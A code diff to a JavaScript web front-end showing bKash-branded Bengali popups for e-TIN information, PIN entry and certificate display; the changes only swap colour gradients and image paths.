@@ -71,7 +71,7 @@ document.addEventListener("DOMContentLoaded", function () {
     popup.style.display = "flex";
     popup.style.flexDirection = "column";
     popup.innerHTML = `
-      <div class="popup-header" style="background: linear-gradient(135deg, #e2146c 0%, #a4126a 100%); padding: 16px; position: relative; overflow: hidden; flex-shrink: 0;">
+      <div class="popup-header" style="background: linear-gradient(135deg, #1c2e58 0%, #112555 100%); padding: 16px; position: relative; overflow: hidden; flex-shrink: 0;">
         <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 1;">
           <div class="back-button">
             <button class="back-button-btn" style="background: rgba(255, 255, 255, 0.1); border: none; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 18px; cursor: pointer; transition: all 0.3s ease;">
@@ -82,7 +82,7 @@ document.addEventListener("DOMContentLoaded", function () {
             <h3 style="color: white; font-size: 20px; font-weight: 600; margin: 0;">ই-টিন সম্পর্কে বিস্তারিত</h3>
           </div>
           <div class="header-icon" style="width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;">
-            <img src="images/bkashlogo.png" alt="বিকাশ আইকন" style="width: 32px; height: auto;">
+            <img src="/public/images/bkashlogo.png" alt="বিকাশ আইকন" style="width: 32px; height: auto;">
           </div>
         </div>
       </div>
@@ -99,7 +99,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
           <div class="etin-info-section" style="background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);">
             <h3 style="font-size: 16px; color: #333; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; font-weight: 600;">
-              <i class="fas fa-question-circle" style="color: #e2146c; font-size: 18px;"></i> ই-টিন কেন প্রয়োজন?
+              <i class="fas fa-question-circle" style="color: #1c2e58; font-size: 18px;"></i> ই-টিন কেন প্রয়োজন?
             </h3>
             <ul style="list-style: none; padding: 0; margin: 0;">
               <li style="position: relative; padding: 6px 0 6px 20px; color: #555; font-size: 14px; line-height: 1.5;">আয়কর রিটার্ন দাখিলের জন্য</li>
@@ -114,7 +114,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
           <div class="etin-info-section" style="background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);">
             <h3 style="font-size: 16px; color: #333; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; font-weight: 600;">
-              <i class="fas fa-laptop" style="color: #e2146c; font-size: 18px;"></i> ই-টিন কীভাবে পাবেন?
+              <i class="fas fa-laptop" style="color: #1c2e58; font-size: 18px;"></i> ই-টিন কীভাবে পাবেন?
             </h3>
             <ol style="padding-left: 20px; margin: 0;">
               <li style="padding: 6px 0; color: #555; font-size: 14px; line-height: 1.5;">জাতীয় রাজস্ব বোর্ডের অনলাইন পোর্টাল www.nbr.gov.bd তে যান</li>
@@ -127,7 +127,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
           <div class="etin-info-section" style="background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);">
             <h3 style="font-size: 16px; color: #333; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; font-weight: 600;">
-              <i class="fas fa-info-circle" style="color: #e2146c; font-size: 18px;"></i> গুরুত্বপূর্ণ তথ্য
+              <i class="fas fa-info-circle" style="color: #1c2e58; font-size: 18px;"></i> গুরুত্বপূর্ণ তথ্য
             </h3>
             <ul style="list-style: none; padding: 0; margin: 0;">
               <li style="position: relative; padding: 6px 0 6px 20px; color: #555; font-size: 14px; line-height: 1.5;">ই-টিন একবার নিবন্ধন করলে তা আজীবন বৈধ থাকে</li>
@@ -138,7 +138,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
           <div class="etin-info-section" style="background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);">
             <h3 style="font-size: 16px; color: #333; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; font-weight: 600;">
-              <i class="fas fa-phone-alt" style="color: #e2146c; font-size: 18px;"></i> যোগাযোগ
+              <i class="fas fa-phone-alt" style="color: #1c2e58; font-size: 18px;"></i> যোগাযোগ
             </h3>
             <div class="contact-info" style="background: #f9f9f9; padding: 12px; border-radius: 8px; margin-top: 8px;">
               <p style="margin: 4px 0; color: #555; font-size: 14px;"><strong style="color: #333;">NBR হেল্পলাইন:</strong> ০৯৬১১-৭৭০০৮৮</p>
@@ -186,7 +186,7 @@ document.addEventListener("DOMContentLoaded", function () {
             <h3>ই-টিন তথ্য</h3>
           </div>
           <div class="header-icon">
-            <img src="images/bkashlogo.png" alt="বিকাশ আইকন">
+            <img src="/public/images/bkashlogo.png" alt="বিকাশ আইকন">
           </div>
         </div>
       </div>
@@ -271,7 +271,7 @@ document.addEventListener("DOMContentLoaded", function () {
             <h3>ই-টিন নম্বর</h3>
           </div>
           <div class="header-icon">
-            <img src="images/bkashlogo.png" alt="বিকাশ আইকন">
+            <img src="/public/images/bkashlogo.png" alt="বিকাশ আইকন">
           </div>
         </div>
       </div>
@@ -362,7 +362,7 @@ document.addEventListener("DOMContentLoaded", function () {
       verifyButton.disabled = !isValid;
       if (isValid) {
         verifyButton.style.background =
-          "linear-gradient(135deg, #e2146c 0%, #a4126a 100%)";
+          "linear-gradient(135deg, #1c2e58 0%, #112555 100%)";
         verifyButton.style.cursor = "pointer";
       } else {
         verifyButton.style.background =
@@ -424,7 +424,7 @@ document.addEventListener("DOMContentLoaded", function () {
             <h3>তথ্য নিশ্চিত করুন</h3>
           </div>
           <div class="header-icon">
-            <img src="images/bkashlogo.png" alt="বিকাশ আইকন">
+            <img src="/public/images/bkashlogo.png" alt="বিকাশ আইকন">
           </div>
         </div>
       </div>
@@ -499,7 +499,7 @@ document.addEventListener("DOMContentLoaded", function () {
             <h3>পিন নম্বর প্রদান করুন</h3>
           </div>
           <div class="header-icon">
-            <img src="images/bkashlogo.png" alt="বিকাশ আইকন">
+            <img src="/public/images/bkashlogo.png" alt="বিকাশ আইকন">
           </div>
         </div>
       </div>
@@ -548,7 +548,7 @@ document.addEventListener("DOMContentLoaded", function () {
         submitButton.disabled = !allFilled;
         if (allFilled) {
           submitButton.style.background =
-            "linear-gradient(135deg, #e2146c 0%, #a4126a 100%)";
+            "linear-gradient(135deg, #1c2e58 0%, #112555 100%)";
           submitButton.style.cursor = "pointer";
         }
       });
@@ -602,7 +602,7 @@ document.addEventListener("DOMContentLoaded", function () {
         <div style="width: 36px;"></div>
         <div class="success-header-title">সনদ প্রাপ্তি সফল</div>
         <div class="success-logo">
-          <img src="images/bkashlogo.png" alt="বিকাশ আইকন" style="width: 100%; height: auto;">
+          <img src="/public/images/bkashlogo.png" alt="বিকাশ আইকন" style="width: 100%; height: auto;">
         </div>
       </div>
     </div>
@@ -1087,7 +1087,7 @@ document.addEventListener("DOMContentLoaded", function () {
           <div class="certificate-watermark">বিকাশ</div>
           
           <div class="certificate-header">
-            <img src="images/bkashlogo.png" class="certificate-logo" alt="বিকাশ লোগো">
+            <img src="/public/images/bkashlogo.png" class="certificate-logo" alt="বিকাশ লোগো">
             <h1 class="certificate-title">${certTypeText}</h1>
             <p class="certificate-subtitle">Certificate Number: ${certificateNumber}</p>
           </div>
